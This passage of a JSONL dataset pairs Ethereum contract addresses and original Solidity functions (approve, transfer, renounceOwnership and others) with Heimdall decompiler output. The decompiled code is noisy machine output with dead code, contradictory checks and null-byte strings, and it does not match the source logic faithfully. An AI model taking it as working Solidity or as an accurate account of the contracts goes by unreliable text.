keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_l), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_o = var_d.length;\n        address var_p = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_l).code.length);\n        (bool success, bytes memory ret0) = address(store_l).Unresolved_791ac947(var_l); // call\n        store_f = uint248(store_f);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(store_p).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_p = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_p = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xEA00f45b33879A1D55f91ff260C20c96a577E566", "original_solidity_code": "function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x01;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_d[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_g = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x24;\n        var_f = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_g = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x5B8BA3cb21F36a06b3a86774103F8dBDa14483EC", "original_solidity_code": "function supportsInterface(bytes4 interfaceId) public view virtual override(IERC165, ERC721) returns (bool) {\r\n        return interfaceId == type(IERC721Enumerable).interfaceId || super.supportsInterface(interfaceId);\r\n    }", "heimdall_decompiled_code": "function supportsInterface(bytes4 arg0) public pure returns (bool) {\n        require(arg0 == (uint32(arg0)));\n        require(uint32(arg0) == 0x780e9d6300000000000000000000000000000000000000000000000000000000);\n        uint32 var_a = !(!(uint32(arg0)) == 0x780e9d6300000000000000000000000000000000000000000000000000000000);\n        return !(!(uint32(arg0)) == 0x780e9d6300000000000000000000000000000000000000000000000000000000);\n        require(uint32(arg0) == 0x80ac58cd00000000000000000000000000000000000000000000000000000000);\n        require(uint32(arg0) == 0x80ac58cd00000000000000000000000000000000000000000000000000000000);\n        var_a = !(!(uint32(arg0)) == 0x80ac58cd00000000000000000000000000000000000000000000000000000000);\n        return !(!(uint32(arg0)) == 0x80ac58cd00000000000000000000000000000000000000000000000000000000);\n        var_a = !(!(uint32(arg0)) == 0x01ffc9a700000000000000000000000000000000000000000000000000000000);\n        return !(!(uint32(arg0)) == 0x01ffc9a700000000000000000000000000000000000000000000000000000000);\n    }"}
{"contract_address": "0x2b3d6a0c36f8Def06B6041B41090971155D124ae", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner), 0);\n        owner = uint96(owner);\n    }"}
{"contract_address": "0xF4DEF1F694801EaBF6f4B4b8b0209E617Bb224e8", "original_solidity_code": "function unblockBot(address notbot) public onlyOwner {\r\n        bots[notbot] = false;\r\n    }", "heimdall_decompiled_code": "function unblockBot(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        address var_e = address(arg0);\n        var_f = 0x10;\n        storage_map_c[var_e] = uint248(storage_map_c[var_e]);\n    }"}
{"contract_address": "0x4EEB531934eb03F55032CF7468957e9cc3b9Ce7d", "original_solidity_code": "function transfer(address recipient, uint256 amount) external override returns (bool) {\r\n        return _transferFrom(msg.sender, recipient, amount);\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(!(bytes1(store_k)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_a = 0x40 + var_a;\n        var_b = 0x14;\n        var_c = 0x496e73756666696369656e742042616c616e6365000000000000000000000000;\n        address var_d = address(msg.sender);\n        var_e = 0x06;\n        require(!(arg1 > storage_map_l[var_d]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_h = var_a.length;\n        uint256 var_i = 0;\n        var_j = var_k;\n        var_i = 0;\n        require(!((storage_map_l[var_d] - arg1) > storage_map_l[var_d]), \"SafeMath: addition overflow\");\n        var_d = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_l = 0x11;\n        var_d = address(msg.sender);\n        var_e = 0x06;\n        storage_map_l[var_d] = storage_map_l[var_d] - arg1;\n        var_d = address(arg0);\n        require(!(storage_map_l[var_d] > (arg1 + storage_map_l[var_d])), \"SafeMath: addition overflow\");\n        var_d = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_l = 0x11;\n        require(!((arg1 + storage_map_l[var_d]) < storage_map_l[var_d]), \"SafeMath: addition overflow\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x1b;\n        var_j = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_d = address(arg0);\n        var_e = 0x06;\n        storage_map_l[var_d] = arg1 + storage_map_l[var_d];\n        var_d = this.code[7345:7377];\n        var_d = var_d;\n        uint256 var_f = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_f = 0x01;\n        return 0x01;\n        var_d = address(msg.sender);\n        var_e = 0x01;\n        require(!(!bytes1(storage_map_l[var_d])), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!bytes1(storage_map_l[var_d])), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!bytes1(storage_map_l[var_d])), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!bytes1(storage_map_l[var_d])), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!bytes1(storage_map_l[var_d])), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_d = address(msg.sender);\n        var_e = 0x01;\n        require(!(!bytes1(storage_map_l[var_d])), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!bytes1(storage_map_l[var_d])), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!bytes1(storage_map_l[var_d])), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!bytes1(storage_map_l[var_d])), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!bytes1(storage_map_l[var_d])), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!bytes1(storage_map_l[var_d])), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!bytes1(storage_map_l[var_d])), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(arg1 > _maxTxAmount), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_d = address(msg.sender);\n        var_e = 0x09;\n        require(bytes1(storage_map_l[var_d]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(msg.sender == (address(pair)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!bytes1(store_k)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!bytes1(store_k)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!(!bytes1(store_k)), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        store_k = var_f | (uint248(store_k));\n        var_e = 0x06;\n        var_d = 0xdead;\n        var_a = 0x40 + var_a;\n        var_b = 0x1e;\n        var_c = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(store_i > totalSupply), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = var_a.length;\n        uint256 var_m = 0;\n        var_j = var_k;\n        var_m = 0;\n        if (!(totalSupply - store_i) > totalSupply) {\n            var_d = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_l = 0x11;\n            if (!pair / 0x01000000000000000000000000000000000000000000) {\n                if (!pair / 0x01000000000000000000000000000000000000000000) {\n                }\n            }\n            require(!((totalSupply - store_i) > totalSupply), \"TX Limit Exceeded\");\n        }\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_n = 0x20;\n        var_o = 0x11;\n        var_g = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        require(!(arg1 > _maxTxAmount), \"TX Limit Exceeded\");\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_n = 0x20;\n        var_o = 0x11;\n        var_g = 0x5458204c696d6974204578636565646564000000000000000000000000000000;\n        if (address(store_m) == (address(arg0))) {\n            if (address(store_m) == (address(arg0))) {\n            }\n        }\n        if (address(store_n) == (address(arg0))) {\n        }\n        if (address(pair) == (address(arg0))) {\n        }\n        if (address(this) == (address(arg0))) {\n            if (address(this) == (address(arg0))) {\n            }\n        }\n        require(bytes1(pair / 0x010000000000000000000000000000000000000000), \"Trading not open yet\");\n        var_b = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_n = 0x20;\n        var_o = 0x14;\n        var_g = 0x54726164696e67206e6f74206f70656e20796574000000000000000000000000;\n        if (address(pair) == (address(arg0))) {\n            if (address(pair) == (address(arg0))) {\n                if (address(pair) == (address(arg0))) {\n                }\n            }\n        }\n    }"}
{"contract_address": "0x23277343916AD0F79447b64CD0b2374791363Fd5", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n        owner = 0 | (uint96(owner));\n    }"}
{"contract_address": "0x620d4B40A1c80D62129bb195e1701e501F9a5d3b", "original_solidity_code": "function approve(address to, uint256 tokenId) external payable;\\n\\n    /**\\n     * @dev Approve or remove `operator` as an operator for the caller.\\n     * Operators can call {transferFrom}", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(0x01 > arg1, CustomError_df2d9b42());\n        require(!(arg1 < totalSupply), CustomError_df2d9b42());\n        uint256 var_a = arg1;\n        var_b = 0x04;\n        require(bytes1(storage_map_n[var_a]), CustomError_df2d9b42());\n        var_c = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        require(storage_map_n[var_a], CustomError_cfb3b942());\n        require(address(storage_map_n[var_a]) == msg.sender, CustomError_cfb3b942());\n        var_a = address(storage_map_n[var_a]);\n        var_b = 0x07;\n        var_a = address(msg.sender);\n        uint256 var_b = keccak256(var_a);\n        require(bytes1(storage_map_n[var_a]), CustomError_cfb3b942());\n        var_a = arg1;\n        var_b = 0x06;\n        storage_map_n[var_a] = (address(arg0)) | (uint96(storage_map_n[var_a]));\n        emit Approval(address(storage_map_n[var_a]), address(arg0), arg1);\n        var_c = 0xcfb3b94200000000000000000000000000000000000000000000000000000000;\n        var_a = arg1;\n        var_b = 0x06;\n        storage_map_n[var_a] = (address(arg0)) | (uint96(storage_map_n[var_a]));\n        emit Approval(address(storage_map_n[var_a]), address(arg0), arg1);\n        var_a = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + arg1;\n        var_b = 0x04;\n        if (storage_map_n[var_a]) {\n            var_a = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + arg1);\n            var_b = 0x04;\n            if (storage_map_n[var_a]) {\n                var_a = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + (0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff + arg1));\n                var_b = 0x04;\n                if (storage_map_n[var_a]) {\n                }\n            }\n        }\n        var_c = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n        var_c = 0xdf2d9b4200000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x7839BbAaFe6B84F088e494818C79D84478411D9e", "original_solidity_code": "function balanceOf(address account)\r\n        public\r\n        view\r\n        virtual\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _balances[account];\r\n    }", "heimdall_decompiled_code": "function balanceOf(address arg0) public view returns (uint256) {\n        require(arg0 == (address(arg0)));\n        address var_a = address(arg0);\n        var_b = 0x01;\n        address var_c = storage_map_b[var_a];\n        return storage_map_b[var_a];\n    }"}
{"contract_address": "0x1557408E1540337349Ca73F948C2FA5Fd94b8d5c", "original_solidity_code": "function transfer(address recipient, uint256 amount) public override returns (bool) {\\n        _transfer(_msgSender(), recipient, amount);\\n        return true;\\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender));\n        require(address(arg0));\n        require(arg1 > 0);\n        require(address(owner) == (address(msg.sender)));\n        require(address(owner) == (address(arg0)));\n        address var_a = address(msg.sender);\n        var_b = 0x05;\n        require(bytes1(storage_map_b[var_a]));\n        require(!bytes1(storage_map_b[var_a]));\n        require(bytes1(store_c / 0x010000000000000000000000000000000000000000), \"SafeMath: multiplication overflow\");\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((0 == ((0 * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((0 * arg1) / arg1) == 0, \"SafeMath: multiplication overflow\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x21;\n        var_g = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_h = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        uint256 var_i = 0x40 + var_i;\n        var_d = 0x1a;\n        var_j = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        require(0x64, \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_h = var_i.length;\n        uint256 var_l = 0;\n        var_m = var_n;\n        var_l = 0;\n        require(0x64, \"Only one transfer per block allowed.\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        require(!(bytes1(transferDelayEnabled)), \"Only one transfer per block allowed.\");\n        require(address(store_e) == (address(arg0)), \"Only one transfer per block allowed.\");\n        require(!(!(address(store_c)) == (address(arg0))), \"Only one transfer per block allowed.\");\n        var_a = tx.origin;\n        var_b = 0x06;\n        require(block.number > storage_map_b[var_a], \"Only one transfer per block allowed.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x24;\n        var_m = 0x4f6e6c79206f6e65207472616e736665722070657220626c6f636b20616c6c6f;\n        var_o = 0x7765642e00000000000000000000000000000000000000000000000000000000;\n        var_a = tx.origin;\n        var_b = 0x06;\n        storage_map_b[var_a] = block.number;\n        require(!(address(store_c) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_c) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_c) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_c) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(address(store_c) == (address(arg0))), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(!bytes1(store_c / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_c / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_c / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_c / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_c / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!((0 * arg1) / 0x64), \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_b[var_a] > (((0 * arg1) / 0x64) + storage_map_b[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(((0 * arg1) / 0x64) + storage_map_b[var_a] < storage_map_b[var_a]), \"SafeMath: addition overflow\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x1b;\n        var_m = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_b[var_a] = ((0 * arg1) / 0x64) + storage_map_b[var_a];\n        uint256 var_k = (0 * arg1) / 0x64;\n        emit Transfer(address(msg.sender), address(this), (0 * arg1) / 0x64);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        var_i = 0x40 + var_i;\n        var_k = 0x1e;\n        var_p = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(!((storage_map_b[var_a] - arg1) > storage_map_b[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_i = 0x40 + var_i;\n        var_q = 0x1e;\n        var_r = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(((0 * arg1) / 0x64) > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_s = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_t = 0x20;\n        uint256 var_u = var_i.length;\n        uint256 var_v = 0;\n        var_w = var_n;\n        var_v = 0;\n        if (!(arg1 - ((0 * arg1) / 0x64)) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_c = 0x11;\n            if (storage_map_b[var_a] > _maxTaxSwap) {\n            }\n            if (!store_g > store_h) {\n            }\n            if (!storage_map_b[var_a] > _taxSwapThreshold) {\n            }\n            require(!((arg1 - ((0 * arg1) / 0x64)) > arg1), \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (store_g > store_k) {\n            if (0 - arg1) {\n            }\n            if (0 - arg1) {\n            }\n            require(store_g > store_k, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        var_h = 0x19;\n        var_m = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(store_e) == (address(arg0))) {\n            if (address(store_e) == (address(arg0))) {\n            }\n        }\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x12;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x29;\n        var_g = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_h = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x23;\n        var_g = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_h = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x25;\n        var_g = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_h = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xF47024a2e10D77927767cBE5aADf5F8BB02782c9", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\\r\\n        return _symbol;\\r\\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_k) {\n            if (store_k - ((store_k / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_k / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_k / 0x02;\n                if (store_k) {\n                    if (store_k - ((store_k / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_k / 0x02) {\n                            if (0x1f < (store_k / 0x02)) {\n                                var_a = 0x69;\n                                var_e = storage_map_d[var_a];\n                                if ((0x20 + var_c) + (store_k / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xC0BA94337896c443b7728Dce84B0A750e290fbFd", "original_solidity_code": "function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(arg1 == arg1);\n        address var_a = address(msg.sender);\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_j[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0x7BEe550EDa5afA8E1C22Ad3Cea77f5D746dC78c3", "original_solidity_code": "function approve(address spender, uint256 amount) external returns (bool);\\r\\n\\r\\n    /**\\r\\n     * @dev Moves `amount` tokens from `from` to `to` using the\\r\\n     * allowance mechanism. `amount` is then deducted from the caller's\\r\\n     * allowance.\\r\\n     *\\r\\n     * Returns a boolean value indicating whether the operation succeeded.\\r\\n     *\\r\\n     * Emits a {Transfer}", "heimdall_decompiled_code": "function approve(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: approve to the zero address\");\n        require(address(arg0), \"ERC20: approve to the zero address\");\n        address var_a = address(msg.sender);\n        var_b = 0x06;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = arg1;\n        uint256 var_c = arg1;\n        emit Approval(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x22;\n        var_f = 